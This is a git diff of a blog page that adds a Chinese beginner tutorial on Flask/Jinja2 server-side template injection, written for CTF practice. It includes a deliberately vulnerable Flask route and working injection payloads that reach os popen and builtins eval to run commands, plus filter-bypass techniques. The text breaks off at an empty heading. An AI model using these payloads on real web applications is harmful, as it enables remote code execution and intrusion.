@@ -16,17 +16,27 @@
   <meta name="author" content="ocean">
   <meta name="keywords" content="">
   
-    <meta name="description" content="oceanのblog">
+    <meta name="description" content="python ssti的学习(以flask为例)起因最近因为参加了newstar的新生赛，从第三周到第五周都有python ssti的题目，所以就简单的学习了一下ssti flask入门参考flask官方文档 Flask 是一个 Python 实现的 Web 开发微框架，是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。更多开发细节">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ssti入门">
 <meta property="og:url" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/index.html">
 <meta property="og:site_name" content="oceanのblog">
-<meta property="og:description" content="oceanのblog">
+<meta property="og:description" content="python ssti的学习(以flask为例)起因最近因为参加了newstar的新生赛，从第三周到第五周都有python ssti的题目，所以就简单的学习了一下ssti flask入门参考flask官方文档 Flask 是一个 Python 实现的 Web 开发微框架，是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。更多开发细节">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018170230556.png">
+<meta property="og:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018171137574.png">
+<meta property="og:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018171310379.png">
+<meta property="og:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018171549408.png">
+<meta property="og:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018171804596.png">
+<meta property="og:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018172814768.png">
+<meta property="og:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018173411167.png">
+<meta property="og:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018184827820.png">
+<meta property="og:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018185833149.png">
 <meta property="article:published_time" content="2022-10-18T11:47:13.000Z">
-<meta property="article:modified_time" content="2022-10-18T11:47:13.726Z">
+<meta property="article:modified_time" content="2022-10-18T12:04:15.327Z">
 <meta property="article:author" content="ocean">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zoceanyq.github.io/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018170230556.png">
   
   
   
@@ -235,7 +245,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          3.2k 字
         
       </span>
     
@@ -246,7 +256,7 @@
         
         
         
-          1 分钟
+          27 分钟
         
       </span>
     
@@ -297,13 +307,97 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="python-ssti的学习-以flask为例"><a href="#python-ssti的学习-以flask为例" class="headerlink" title="python ssti的学习(以flask为例)"></a>python ssti的学习(以flask为例)</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>最近因为参加了newstar的新生赛，从第三周到第五周都有python ssti的题目，所以就简单的学习了一下ssti</p>
+<h2 id="flask入门"><a href="#flask入门" class="headerlink" title="flask入门"></a>flask入门</h2><p>参考<a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/flask/">flask官方文档</a></p>
+<p>Flask 是一个 Python 实现的 Web 开发微框架，是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。更多开发细节可以参考上面的flask中文文档。</p>
+<h2 id="ssti入门"><a href="#ssti入门" class="headerlink" title="ssti入门"></a>ssti入门</h2><p>SSTI 即服务端模板注入攻击(Server-Side Template Injection)，服务端接受用户输入，将其作为 Web 应用模板的一部分，渲染编译后执行了恶意内容，导致敏感信息泄露、代码执行等。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2、mako、tornado、django，PHP框架smarty twig，java框架jade 、velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。</p>
+<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制（相当于一个白名单，你只能用这个白名单里面的东西），但同样存在沙箱逃逸技术来绕过。<br>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。<br>通俗来说，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python3</span><br><span class="hljs-comment">#Flask version:1.11.1</span><br><span class="hljs-comment">#Jinja2: 2.10</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>    t = Template(<span class="hljs-string">&quot;Hello &quot;</span> + name)<br>    <span class="hljs-keyword">return</span> t.render()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run();<br></code></pre></td></tr></table></figure>
+
+<p>可以看到源代码这里直接将get方法的name变量输出了，由于前端是由jinja进行模板渲染的而在jinja中由{{}}包裹的会被当做变量输出，所以当我们输入{{7*7}}时就会输出49</p>
+<img src="/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018170230556.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="ssti前置知识"><a href="#ssti前置知识" class="headerlink" title="ssti前置知识"></a>ssti前置知识</h3><p>在学习SSTI注入之前，我们首先需要了解一些python的魔术方法和内置类</p>
+<h5 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h5><p><code>__class__</code>用于返回该对象所属的类</p>
+<img src="/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018171137574.png" srcset="/img/loading.gif" lazyload class="">
+
+<h4 id="base"><a href="#base" class="headerlink" title="base"></a><strong>base</strong></h4><p><code>__base__</code>用于获取类的基类（也称父类）</p>
+<img src="/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018171310379.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="mro"><a href="#mro" class="headerlink" title="mro"></a><strong>mro</strong></h3><p><code>__mro__</code>返回解析方法调用的顺序。（当调用_mro_[1]或者-1时作用其实等同于_base_)</p>
+<img src="/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018171549408.png" srcset="/img/loading.gif" lazyload class="">
+
+<h4 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h4><p><code>__subclasses__()</code>可以获取类的所有子类</p>
+<img src="/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018171804596.png" srcset="/img/loading.gif" lazyload class="">
+
+<h4 id="常用过滤器"><a href="#常用过滤器" class="headerlink" title="常用过滤器"></a>常用过滤器</h4><p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#filters">参考官方文档</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">1，过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数<br>2，可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器.<br></code></pre></td></tr></table></figure>
+
+<p>其实就是可以实现一些简单的功能，比如attr()过滤器可以实现代替<code>.</code>，join()可以将字符串进行拼接，reverse可以将字符串反置等等</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">length() <span class="hljs-comment"># 获取一个序列或者字典的长度并将其返回</span><br><br><span class="hljs-built_in">int</span>()：<span class="hljs-comment"># 将值转换为int类型；</span><br><br><span class="hljs-built_in">float</span>()：<span class="hljs-comment"># 将值转换为float类型；</span><br><br>lower()：<span class="hljs-comment"># 将字符串转换为小写；</span><br><br>upper()：<span class="hljs-comment"># 将字符串转换为大写；</span><br><br>reverse()：<span class="hljs-comment"># 反转字符串；</span><br><br>replace(value,old,new)： <span class="hljs-comment"># 将value中的old替换为new</span><br><br><span class="hljs-built_in">list</span>()：<span class="hljs-comment"># 将变量转换为列表类型；</span><br><br>string()：<span class="hljs-comment"># 将变量转换成字符串类型；</span><br><br>join()：<span class="hljs-comment"># 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用</span><br><br>attr(): <span class="hljs-comment"># 获取对象的属性</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="ssti语句构造"><a href="#ssti语句构造" class="headerlink" title="ssti语句构造"></a>ssti语句构造</h2><p>前面讲了这么多，终于可以开始了</p>
+<p>首先我们需要拿到当前类，也就是使用**””._<em>class</em>_**</p>
+<img src="/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018172814768.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>第二步拿到基类，也就是使用_<em>base</em>__获得，也可以使用__mro__获得（我学的时候就是因为不知道为什么一会用base一会用mro就觉得很烦躁…….）</p>
+<img src="/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018173411167.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>第三步，拿到基类的子类，用<code>__subclasses__()</code>，拿到子类过后我们就可以寻找可以用于执行命令或者读取文件的类，大多数利用的是<code>os._wrap_close</code>这个类</p>
+<p>接下来就可以利用<code>os。_wrap_close</code>，这个类中有<code>popen</code>方法，我们去调用它<br>首先<br>先调用它的__init__方法进行初始化类</p>
+<img src="/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018184827820.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>然后调用globals获取到方法内以字典的形式返回的方法，属性等</p>
+<img src="/2022/10/18/ssti%E5%85%A5%E9%97%A8/image-20221018185833149.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>到这一步就可以rce了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>还有一个比较厉害的模块，就是<code>__builtins__</code>,它里面有<code>eval()</code>等函数，我们可以也利用它来进行RCE<br>它的payload是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="常见的绕过"><a href="#常见的绕过" class="headerlink" title="常见的绕过"></a>常见的绕过</h2><p>当然前面讲的只是在没有任何过滤的情况下payload才这样写，在平时做题的时候或多或少都会有一些过滤</p>
+<h3 id="被过滤"><a href="#被过滤" class="headerlink" title=".被过滤"></a>.被过滤</h3><p>当.被过滤后意味着我们就不能使用.__class了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&#x27;__class__&#x27;</span>]&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们就可以这样来绕过.</p>
+<h3 id="被过滤-1"><a href="#被过滤-1" class="headerlink" title="_被过滤"></a>_被过滤</h3><p>当_被过滤时，有以下几种方法绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>、通过<span class="hljs-built_in">list</span>获取字符列表，然后用pop来获取_，举个例子<br>&#123;% <span class="hljs-built_in">set</span> a=(()|select|string|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">24</span>)%&#125;&#123;%<span class="hljs-built_in">print</span>(a)%&#125;<br><span class="hljs-number">2</span>、可以通过十六进制，或者Unicode编码的方式进行绕过这个方法也通常用来绕过关键字绕过，举个例子<br>&#123;&#123;()[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125; =&#123;&#123;().__class__&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>绕过[]</p>
+<p>这种情况我还没遇见过，就参考的大佬的文章</p>
+<p>这个时候可以使用<code>__getitem__</code> 魔术方法，它的作用简单说就是可以把中括号转换为括号的形式，举个例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__bases__[<span class="hljs-number">0</span>]=__bases__.__getitem__(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3>
                 
               </div>
             
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/python/" class="category-chain-item">python</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
